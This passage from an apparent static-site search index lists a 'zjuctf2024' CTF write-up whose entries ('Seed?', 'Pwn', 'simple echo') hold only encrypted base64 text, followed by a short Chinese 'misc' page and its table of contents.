LF+7g0lwePAsFtXlIvmXMxHqeMTNKDHZAkv/e1dgYWU6sPWyoNAraxthv39wUeFD4+cBd64eLjmd4OQ3fNHF5nQTomY6gManKN1hPWA12BEl48LLQNJWGqoT3a4EI/1JjYJeWra2nrydkN5niXEzsgXNNraxZSwEq1YkU7SK2Fd+u/vkTA8my+NW9WBSr7Tial7EI8/0KwTqnXslnonIley+2/7HQ6NusuhJcOcu2e1I7RmcLiunUQx5fxBHsR/RAAs2LTeKVlPanGvWpA1DyC3+uan1d5mv1PxILMjsGypzuScRhLB2UA23kuN+C+05y16HtYWlhD0KBkFbbyWbhudh5xYbivC13i3Qni0Nawu5F4yQBI9La+5QiFPfSjGFhj/e63fC/GMr6pXFiq3FVZV415tNeS1caj6n7MZMYLZRldr6aeJwP0yxDLyE61e92vGlWGVLoWQvXVrGlahDxS0uSroeKGy+xnJqRqjMNUYOfw5hA7Jh9eJMiL2fSWapNUAfxkuHdO6d1UpeCpDZBcmxbMHFfOj18hrG7FEGJCmRkivX2C0UwloQXrF+e+s18+9ndQcpsnt7Q12iuRXJYWDu+sZUH12uipm+wif3jA/CSJ7H6aMgcoERMiKbsEpPldWaOV3ANUhJvMQl7tcD4RGEe3GcwNplHP4iRjdDS2Y8KykZbDs3hhp7NyjkoSxQAo+71Jd3j87ecJcA55ElVRxgh0M3YvYnhi5j5fIoVPhKdQ70geTVz0Y/Snvzj5XhQc10iAzjOxIVspnVr1rBUOK/qXHYmPuOdaR9w9mEp8+aafxj4dRYaTqN1Tze/BzXlmLlLWuCkOu53zlKDVNLFy3o1BZG+OMYloRYLO4qSMWIvr4bh8fZoUJOWCfVNRjJ7HnoFP5F8Ybprr8YV7IrOgKXN1aaii4i1D7Pv3M914dxOZkgxfeuZX14HbIMkiv3i+MtWPa3nNDpnhuxRNUWZYS06xtnmJbB6GFYYtDV2v6A4j0XkFlPFijH//ljFoU9o1hQf8UBD4ozFqY14n6+N3qJTuojTaSEA182S3L42MWC7XtEPD7P864QB7zzYV3mvsr5VG+QGaXCKnZyokegA9IAnENIF34FM+0aiS2tCgerMAsJKJ0P67tlhsp/rIiznQlonMLV/fTPbd59VQrahjcsiRYi2ppHppEZfXrps95TS8MqfieP5/VtApazpWumaNxlXuzpI9hb8ye3JYl/iB6mPBxtsBdcdy1UrT/IiT8jljGiXOZdWAQ2sJ9nfHl1Bki0IoGZOWR6e8YvhXEkSjcv4eYseMvEFJ2ZmelMAUd3sRQHmCMUXxp5YkoJVGP9fEtmyoq0cdlKcpJx+GLZcYuJbubB1pbcEB0xJonmKqJkFDqumetVTCCTM9/mI/I25AibDQTVw5RVfrQg1zraqQGY1DX3yjhgqL57PkfGjjnuZcrjP4HZ/fFCsdKmEmjYn;^","title":"Seed?"},{"location":"ctf/writeups/zjuctf2024/#pwn","text":"9NTTFv/qS3/2mYCCjbIbRw==;SxKbI5UkVXpbS5aX+iF97ILHN1ngLshLVYaLkaEtfjg=;^","title":"Pwn"},{"location":"ctf/writeups/zjuctf2024/#simple-echo","text":"N6ZoXXK9kyc3hCqJeTkq0Q==;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;^","title":"simple echo"},{"location":"others/","text":"\u6742\u9879 \u00b6 Abstract \u8fd9\u91cc\u662f\u4e00\u4e9b\u4e34\u65f6\u7684\u4e1c\u897f Table of Contents \u00b6 note\u8ba1\u5212","title":"\u6742\u9879"},{"location":"others/#_1","text":"Abstract \u8fd9\u91cc\u662f\u4e00\u4e9b\u4e34\u65f6\u7684\u4e1c\u897f","title":"\u6742\u9879"},{"location":"others/#table-of-contents","text":"note\u8ba1\u5212","title":"Table of Contents"}]}